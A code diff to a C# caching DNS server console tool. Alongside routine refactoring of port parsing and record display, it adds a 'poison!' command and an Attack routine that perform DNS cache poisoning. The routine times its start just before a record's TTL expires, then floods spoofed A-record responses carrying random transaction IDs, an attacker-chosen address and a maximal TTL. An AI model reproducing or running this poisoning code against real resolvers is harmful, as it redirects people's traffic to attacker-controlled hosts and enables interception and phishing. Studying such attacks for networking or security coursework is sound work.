@@ -1,4 +1,6 @@
 ﻿using System;
+using System.Collections.Generic;
+using System.Data;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -28,18 +30,11 @@ namespace DnsCache
             {
                 try
                 {
-                    var entries = Dns.GetHostEntry(ipWords[0]).AddressList;
-                    Console.WriteLine(string.Join("; ", entries.Cast<object>()));
-                    if (entries.Length < 0)
-                    {
-                        Console.WriteLine("Failed to resolve '{0}'", ipWords[0]);
-                        return;
-                    }
-                    ip = entries.First(address => address.AddressFamily == AddressFamily.InterNetwork);
-                    Console.WriteLine("Selected : " + ip);
+                    ip = Dns.GetHostEntry(ipWords[0]).AddressList.First(address => address.AddressFamily == AddressFamily.InterNetwork);
                 }
                 catch
                 {
+                    Console.WriteLine("Failed to resolve '{0}'", ipWords[0]);
                     ReportUsage();
                     return;
                 }
@@ -47,17 +42,18 @@ namespace DnsCache
             ushort listenPort = 53;
             ushort remotePort = 53;
             if (ipWords.Length > 1)
-                ushort.TryParse(ipWords[1], out listenPort);
-            dns.Port = listenPort;
+                ushort.TryParse(ipWords[1], out remotePort);
             if (args.Length == 2)
             {
-                if (!ushort.TryParse(args[1], out remotePort))
+                if (!ushort.TryParse(args[1], out listenPort))
                 {
                     ReportUsage();
                     return;
                 }
             }
+            dns.Port = listenPort;
             dns.ParentServer = new IPEndPoint(ip, remotePort);
+            dns.UpdateRecordsOnTTL = true;
 
             var t = new Thread(() => dns.Listen());
             t.Start();
@@ -95,19 +91,10 @@ namespace DnsCache
                         if (!Enum.TryParse(words[1], true, out a0))
                             break;
                         var a1 = words[2];
-                        var node = dns.DomainRoot.Resolve(a1);
-                        if (node == null)
-                        {
-                            Console.WriteLine("[!]: Not found! domain subtree is nt yet built");
-                            break;
-                        }
-                        var results = node.GetAllRecords(false, a0).ToList();
-                        results.Sort((a, b) => a.ExpirationTime < b.ExpirationTime ? 1 : (a.ExpirationTime == b.ExpirationTime ? 0 : -1));
-                        Console.WriteLine("[i]: " + results.Count + " results found:");
+                        var results = dns.GetLocalResourceData(a0, a1);
+                        Console.WriteLine("[i]: " + results.Length + " results found:");
                         foreach (var r in results)
-                        {
                             Console.WriteLine("\t" + r);
-                        }
                         break;
                     }
                     case "??":
@@ -149,6 +136,17 @@ namespace DnsCache
                         Console.WriteLine("[!]: Sent!");
                         break;
                     }
+                    case "poison!":
+                    {
+                        if (words.Length != 3)
+                            break;
+                        var a1 = words[1];
+                        IPAddress a2;
+                        if (!IPAddress.TryParse(words[2], out a2))
+                            break;
+                        Attack(dns, a1, a2);
+                        break;
+                    }
                 }
                 s = (Console.ReadLine() ?? "").ToLowerInvariant();
             }
@@ -169,27 +167,62 @@ namespace DnsCache
         {
             f.WriteLine(offset + "#DOMAIN: " + domain.AccumulateLabels());
             offset += "\t";
-            foreach (var r in domain.Authority)
-            {
-                f.WriteLine(offset + "[auth]: " + r);
-            }
             foreach (var r in domain.Cache)
-            {
-                f.WriteLine(offset + "[cache]: " + r);
-            }
-            foreach (var r in domain.AdditionalInfo)
-            {
-                f.WriteLine(offset + "[info]: " + r);
-            }
+                f.WriteLine(offset + r);
+            
             foreach (var d in domain.SubDomains)
-            {
                 PrintDomain(d,f, offset);
-            }
         }
 
         static void ReportUsage()
         {
             Console.WriteLine("Usage: {0} <parent_dns_hostname_or_ip>:<[port]> <[listen_port]>");
+        }
+
+        private static void Attack(DnsCacheServer dns, string domainName, IPAddress newAddress)
+        {
+            var request = new RequestRecord {Class = DnsQueryClass.IN, Key = domainName, Type = DnsQueryType.A};
+            var answer = new ResourceRecord
+            {
+                Class = DnsQueryClass.IN,
+                Key = domainName,
+                Type = DnsQueryType.A,
+                Data = newAddress.GetAddressBytes(),
+                TTL = int.MaxValue
+            };
+            var results = dns.GetLocalData(DnsQueryType.A, domainName).Where(r => r.SecondsLeft >= 2).ToList();
+
+            if (!results.Any())
+            {
+                Console.WriteLine("[!]: Need to know {0}`s ttl, requesting, (sleep 2 secs)...");
+                dns.SendDnsRequestTo(dns.ParentServer, request);
+                Thread.Sleep(2000);
+                results = dns.GetLocalData(DnsQueryType.A, domainName).Where(r => r.SecondsLeft >= 2).ToList();
+                if (!results.Any())
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("[!] Failed to obtain ttl!");
+                    Console.ForegroundColor = ConsoleColor.White;
+                    return;
+                }
+            }
+            var victimRecord = results.First();
+
+            var timeLeft = (int) (victimRecord.TimeLeft.TotalMilliseconds - 1500);
+
+            Console.WriteLine("[!] Attack will be started within {0} seconds", timeLeft/1000.0);
+            var thread = new Thread(() =>
+            {
+                Thread.Sleep(timeLeft);
+                var timeStart = DateTime.Now;
+                Console.WriteLine("[!]: Attack started!");
+                while ((DateTime.Now - timeStart).TotalSeconds < 3)
+                {
+                    dns.SendDnsResponseTo(dns.ParentServer, (ushort)Rnd.Next(1, 65536), new[] { request }, new[] { answer }, null, new[] { answer });
+                }
+                Console.WriteLine("[!]: Attack finished!");
+            });
+            thread.Start();
         }
 
     }
